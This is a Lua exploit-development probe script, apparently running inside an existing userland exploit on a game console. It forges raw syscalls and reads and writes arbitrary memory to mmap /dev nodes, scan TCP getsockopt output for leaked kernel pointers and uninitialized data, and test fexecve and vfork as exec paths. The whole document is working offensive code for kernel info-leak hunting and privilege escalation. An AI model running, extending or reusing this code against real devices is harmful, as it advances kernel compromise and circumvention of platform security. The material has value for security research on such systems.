-- CRASH_CLASS: HIGH
-- PROBE 93d6: device node mmap scan + TCP_FASTOPEN deep read
--
-- A) Try mmap on every accessible /dev node (looking for kernel-backed pages)
-- B) Deep scan TCP_FASTOPEN 236-byte output for kernel pointers
-- C) Deep scan TCP_PCAP_OUT output
-- D) Try fexecve(492) as alt exec path

print("=== PROBE 93d6: DEV MMAP + TCP DEEP SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Helper: open a /dev path
local function open_dev(name)
    local path = memory.alloc(64)
    local full = "/dev/" .. name
    for i = 1, #full do wd(N(path) + i - 1, string.byte(full, i)) end
    wd(N(path) + #full, 0)
    local ok, ret = pcall(function() return mk(5)(path, uint64(2)) end) -- O_RDWR
    if ok and N(ret) >= 0 and N(ret) < 100 then return N(ret) end
    -- Try O_RDONLY
    ok, ret = pcall(function() return mk(5)(path, uint64(0)) end)
    if ok and N(ret) >= 0 and N(ret) < 100 then return N(ret) end
    return nil
end

-- ======== SECTION A: mmap on device nodes ========
print("--- A: mmap on /dev nodes ---")

local devs = {"ajm", "gc", "dce", "dmem0", "dmem1", "camera", "rng",
              "gic", "hid", "bt", "zero", "null", "urandom"}

for _, dname in ipairs(devs) do
    local fd = open_dev(dname)
    if fd then
        -- Try mmap(NULL, 0x4000, PROT_READ, MAP_SHARED, fd, 0)
        local ok_m, rv_m = pcall(function()
            return mk(477)(uint64(0), uint64(0x4000), uint64(1),
                uint64(1), uint64(fd), uint64(0))
        end)
        local mret = ok_m and N(rv_m) or 0
        local mh, ml = split(ok_m and rv_m or 0)

        local tag = "FAIL"
        if ok_m and (mh > 0 or ml > 0x1000) then
            tag = string.format("addr=0x%08X%08X", mh, ml)
            -- Try reading the mapped page
            local rval = rd(ml)
            if rval ~= nil then
                tag = tag .. string.format(" readable val=0x%X", rval)
                -- Scan for kernel pointers
                local kptrs = 0
                for off = 0, 0x3FF8, 8 do
                    local lo = rd(ml + off) or 0
                    local hi = rd(ml + off + 4) or 0
                    if lo < 0 then lo = lo + 0x100000000 end
                    if hi < 0 then hi = hi + 0x100000000 end
                    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                        kptrs = kptrs + 1
                        if kptrs <= 2 then
                            tag = tag .. string.format(" [KPTR +0x%X: 0x%08X%08X]", off, hi, lo)
                        end
                    end
                end
                if kptrs > 0 then tag = tag .. " kptrs=" .. kptrs end
            else
                tag = tag .. " UNREADABLE"
            end
            -- Unmap
            pcall(function() mk(73)(rv_m, uint64(0x4000)) end)
        end

        -- Also try PROT_READ|PROT_WRITE, MAP_SHARED
        local ok_m2, rv_m2 = pcall(function()
            return mk(477)(uint64(0), uint64(0x4000), uint64(3),
                uint64(1), uint64(fd), uint64(0))
        end)
        local m2h, m2l = split(ok_m2 and rv_m2 or 0)
        local tag2 = ""
        if ok_m2 and (m2h > 0 or m2l > 0x1000) then
            tag2 = " RW_OK"
            pcall(function() mk(73)(rv_m2, uint64(0x4000)) end)
        end

        print(string.format("  /dev/%-12s fd=%d mmap=%s%s", dname, fd, tag, tag2))
        pcall(function() mk(6)(uint64(fd)) end)
    end
    if not alive() then print("  DEAD!"); return end
end

-- ======== SECTION B: TCP_FASTOPEN deep scan ========
print("")
print("--- B: TCP_FASTOPEN deep output scan ---")

local ok_s, rv_s = pcall(function()
    return mk(97)(uint64(2), uint64(1), uint64(6))
end)
local tcp_fd = ok_s and N(rv_s) or -1

if tcp_fd >= 0 then
    local buf = memory.alloc(0x200)
    local lenp = memory.alloc(8)

    -- Fill with sentinel
    for i = 0, 0x1F8, 4 do wd(N(buf) + i, 0xDEAD0000 + i) end
    wd(N(lenp), 0x200)

    local ok_g, rv_g = pcall(function()
        return mk(118)(uint64(tcp_fd), uint64(6), uint64(0x20),
            uint64(N(buf)), uint64(N(lenp)))
    end)
    local gret = ok_g and N(rv_g) or -999
    if gret >= 0x80000000 then gret = gret - 0x100000000 end
    local olen = rd(N(lenp)) or 0
    print(string.format("TCP_FASTOPEN(0x20): ret=%d len=%d", gret, olen))

    if gret == 0 and olen > 0 then
        -- Full hex dump of first 240 bytes
        local kptrs = 0
        for off = 0, math.min(olen - 4, 0xEC), 8 do
            local lo = rd(N(buf) + off) or 0
            local hi = rd(N(buf) + off + 4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            local tag = ""
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                kptrs = kptrs + 1
                tag = " *** KPTR ***"
            end
            if hi ~= 0 or lo ~= 0 then
                print(string.format("  +0x%02X: 0x%08X_%08X%s", off, hi, lo, tag))
            end
        end
        print("kptrs=" .. kptrs)

        -- Check for sentinel leakage (uninitialized data)
        local sentinel_count = 0
        for off = olen, 0x1F8, 4 do
            local v = rd(N(buf) + off) or 0
            if v < 0 then v = v + 0x100000000 end
            local expected = 0xDEAD0000 + off
            if v ~= expected then
                sentinel_count = sentinel_count + 1
            end
        end
        if sentinel_count > 0 then
            print("  sentinel overwritten past declared len: " .. sentinel_count .. " dwords")
        end
    end

    -- ======== SECTION C: Full TCP option output dump ========
    print("")
    print("--- C: All TCP options with data ---")

    for optnum = 0, 0x100 do
        for i = 0, 0x100, 4 do wd(N(buf) + i, 0xCC000000 + optnum) end
        wd(N(lenp), 0x100)
        local ok_o, rv_o = pcall(function()
            return mk(118)(uint64(tcp_fd), uint64(6), uint64(optnum),
                uint64(N(buf)), uint64(N(lenp)))
        end)
        local oret = ok_o and N(rv_o) or -999
        if oret >= 0x80000000 then oret = oret - 0x100000000 end
        if oret == 0 then
            local olen2 = rd(N(lenp)) or 0
            local first = rd(N(buf)) or 0
            local kp = 0
            for off = 0, math.min(olen2 - 4, 0xFC), 8 do
                local lo = rd(N(buf) + off) or 0
                local hi = rd(N(buf) + off + 4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then kp = kp + 1 end
            end
            local tag = ""
            if kp > 0 then tag = string.format(" KPTR=%d", kp) end
            if olen2 > 4 then
                print(string.format("  opt 0x%02X: len=%3d val=0x%08X%s", optnum, olen2, first, tag))
            end
        end
        if not alive() then break end
    end

    pcall(function() mk(6)(uint64(tcp_fd)) end)
end

-- ======== SECTION D: fexecve(492) ========
print("")
print("--- D: fexecve/posix_spawn reachability ---")
local ok_fe, rv_fe = pcall(function()
    return mk(492)(uint64(0), uint64(0), uint64(0))
end)
local fe_ret = ok_fe and N(rv_fe) or -999
if fe_ret >= 0x80000000 then fe_ret = fe_ret - 0x100000000 end
print(string.format("fexecve(492): ret=%d ok=%s", fe_ret, tostring(ok_fe)))

-- posix_spawn is usually a libc wrapper, not a syscall
-- vfork (66)
local ok_vf, rv_vf = pcall(function() return mk(66)() end)
local vf_ret = ok_vf and N(rv_vf) or -999
if vf_ret >= 0x80000000 then vf_ret = vf_ret - 0x100000000 end
print(string.format("vfork(66): ret=%d ok=%s", vf_ret, tostring(ok_vf)))

print("")
print("alive=" .. tostring(alive()))
print("=== 93d6 COMPLETE ===")
